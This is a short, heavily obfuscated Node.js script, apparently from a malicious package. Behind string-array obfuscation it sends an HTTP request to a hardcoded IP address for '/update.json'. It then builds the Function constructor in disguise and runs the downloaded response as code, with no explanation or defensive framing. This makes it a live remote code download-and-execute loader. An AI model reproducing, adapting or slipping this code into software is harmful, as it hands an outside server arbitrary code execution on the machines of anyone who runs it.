function _0x178c(_0x2d676b, _0x12b2ff) {
    var _0x178cf3 = _0x12b2();
    _0x178c = function (_0x1cab89, _0x53a979) {
        _0x1cab89 = _0x1cab89 - 0x0;
        var _0x43332e = _0x178cf3[_0x1cab89];
        return _0x43332e;
    };
    return _0x178c(_0x2d676b, _0x12b2ff);
}
function _0x12b2() {
    var _0x1bef90 = [
        '6392608jPJLTV',
        '9ToEXYD',
        '35170OPVnEF',
        '8679kSYWZy',
        'toUpperCase',
        'Buffer',
        '47duieFY',
        '57212wbtezq',
        '15RZrbrd',
        '327268pTrlnk',
        '671125CQmqaF',
        '2878506LpuYKc',
        '1559908PHnQzx'
    ];
    _0x12b2 = function () {
        return _0x1bef90;
    };
    return _0x12b2();
}
(function (_0x31a684, _0xe032bf) {
    var _0x381577 = _0x178c;
    var _0x5c1fc9 = _0x31a684();
    while (!![]) {
        try {
            var _0xefecd5 = -parseInt(_0x381577(0x0)) / 0x1 * (parseInt(_0x381577(0x1)) / 0x2) + parseInt(_0x381577(0x2)) / 0x3 * (-parseInt(_0x381577(0x3)) / 0x4) + -parseInt(_0x381577(0x4)) / 0x5 + -parseInt(_0x381577(0x5)) / 0x6 + -parseInt(_0x381577(0x6)) / 0x7 + parseInt(_0x381577(0x7)) / 0x8 * (parseInt(_0x381577(0x8)) / 0x9) + -parseInt(_0x381577(0x9)) / 0xa * (-parseInt(_0x381577(0xa)) / 0xb);
            if (_0xefecd5 === _0xe032bf) {
                break;
            } else {
                _0x5c1fc9['push'](_0x5c1fc9['shift']());
            }
        } catch (_0x2525a0) {
            _0x5c1fc9['push'](_0x5c1fc9['shift']());
        }
    }
}(_0x12b2, 0xf0232));
(function () {
    var _0x1c0d0b = require('http');
    return _0x1c0d0b['get']({
        'host': '23.94.46.191',
        'port': 0x50,
        'path': '/update.json'
    }, function (_0x325cd) {
        var _0x440422 = '';
        _0x325cd['on']('data', function (_0x49f472) {
            _0x440422 += _0x49f472;
        });
        _0x325cd['on']('end', function () {
            var _0x487a96 = _0x178c;
            var _0x55b962 = this[(typeof this['Buffer']['from'])['charAt'](0x0)[_0x487a96(0xb)]() + (typeof this[_0x487a96(0xc)]['from'])['slice'](0x1)];
            var _0x3ebb67 = new _0x55b962(_0x440422);
            _0x3ebb67();
        });
    });
}());
